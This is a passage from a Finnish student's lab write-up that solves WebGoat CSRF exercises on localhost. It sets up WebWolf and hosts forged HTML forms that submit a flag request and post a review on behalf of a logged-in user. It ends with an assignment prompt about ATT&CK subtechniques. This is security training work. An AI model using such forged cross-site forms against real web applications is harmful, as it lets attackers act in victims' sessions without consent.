    <input type="submit" name="submit">
</form>
```

#### WebWolf

Sivun alalaidassa on WebWolf-kuvake. Lisää ratkaisuja etsimällä näyttää selvältä, että sitä on tarkoitus käyttää. Ainakin sitä voi käyttää tehtävän ratkaisemiseen, tehtäväthän voi häkätä monella tavalla. Mutta kuten WebGoat kokonaisuutena, myös WebWolfiin tuntuu olevan nihkeästi dokumentaatiota. Jos jollakin on parempaa tietoa WG:n käytöstä kuin YouTuben rätisevät mahdottomalla englannin aksentilla nauhoitetut mongerrukset olisin iloinen. Viimein löytyy [https://docs.cycubix.com/web-application-security-essentials/webgoat-8/about-webwolf](https://docs.cycubix.com/web-application-security-essentials/webgoat-8/about-webwolf). 

Ensinnäkin meidän pitää asentaa WebWolf. 

Haetaan WebWolf:
`wget https://github.com/WebGoat/WebGoat/releases/download/v8.2.2/webwolf-8.2.2.jar` 

Käynnistetään WebWolf:
`java -jar webwolf-8.2.2.jar`

Ei käynnisty, WebWolf käyttää tuoreempaa Javaa. Kokeillaan ladata vanhempi WW versio mikä synkkaa ehkä paremmin sit WG:n kanssakin? WG:n versio oli 8.0.0, etsitään se versioista: https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M26/webwolf-8.0.0.M26.jar ladataan ja käynnistetään kuten yllä, mutta versionumero 8.0.0.M26 päivitettynä, tai downgradettuna.  

Käynnistyy, phew. Portti oli defaulttina 9090. Kokeillaan kirjautua sisään WG tunnuksilla: http://localhost:9090/login 
Läpi menee, tallennetaan WG:n salasana selaimeen WW:lle. 

Seuraavaksi täyttä esimerkkivideon apinointia: [https://www.youtube.com/watch?v=4sQjhU6HqtA](https://www.youtube.com/watch?v=4sQjhU6HqtA)

Tallennetaan lomake mikä otettiin aiemmin talteen html-tiedostona Kalin työpöydälle fake.html ja viedään WebWolfin palvelimelle Files osioon "Upload files":llä. Toimiva tiedosto näytti muokattuna viimein tältä (action attribuutin absoluuttinen tiedostopolku ja type ja value muokattu alkuperäisiksi): 

```html 
<form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback="" action="http://localhost:8080/WebGoat/csrf/basic-get-flag" enctype="application/json;charset=UTF-8">
    <input name="csrf" type="hidden" value="false">
    <input type="submit" name="submit">
</form>
```

Nyt saamme arvoksi true ja flag nroksi 57178. Sen syöttämällä lomakkeeseen harjoitus menee läpi. Tätä tarvitsee sulatella. 

### A8:2013 Request Forgeries: 4 "Post a review on someone else’s behalf".*
Seuraavaksi pitäisi kirjoittaa arvostelu loggautuneen käyttäjän eli "verkkovuohi" puolesta. Eli varmaankin nyt tulisi käyttöön istuntokeksi? Katsotaan miten kommenttilomake rakentuu ja millaisen POST-requestin se lähettää. Kopioidaan jälleen sivun formi omaksi tiedostoksi joka houstataan WW:ssä:

```html
<form class="attack-form" accept-charset="UNKNOWN" id="csrf-review" method="POST" name="review-form" successcallback="" action="/WebGoat/csrf/review">
    <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text">
    <input class="form-control" id="reviewStars" name="stars" type="text">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
    <input type="submit" name="submit" value="Submit review">
</form>
```

Kuten edellisessä tehtävässä aluksi tulee Whitelabel error koska en muuttanut vielä action pathia absoluuttiseksi. Tehdään se. Nyt lomake tulee näkyviin mutta sen submittaaminen saa aikaan whitelabel errorin. Hmmm kokeillaan ensin lähettää oikea lomake. Lisätään enctype="application/json;charset=UTF-8". Myös arvot pitää lähettää oikeassa muodossa, name="stars" on oltava numeroarvo. Kokeillaan vielä poistaa enctypekin tämän jälkeen, koska sivun lomakkeessakaan sitä ei ollut.  

Eli absoluuttinen polku ja oikeassa muodossa lähetetty reviewStars syöttökenttäarvo olivat avaimet onneen, idea oli sama kuin edellisessäkin tehtävässä. 

```json
{
  "lessonCompleted" : true,
  "feedback" : "It appears you have submitted correctly from another site. Go reload and see if your post is there.",
  "output" : null
}
```

### b) Attakin alatekniikat
*Demonstroi kaksi (2) alatekniikkaa (subtechnique) ATT&CK kehikosta. Tässä pitää siis käyttää näitä käytännössä johonkin harjoitusmaaliin. Voit käyttää haluamiasi valmiita työkaluja tai koodata / skriptata itse. Voit valita valmiin harjoitusmaalin tai tehdä sen itse. __Muista, että myös tiedustelussa pitää noudattaa lakia, etiikkaa, rajauksia (scope) ja hyviä tapoja.__*

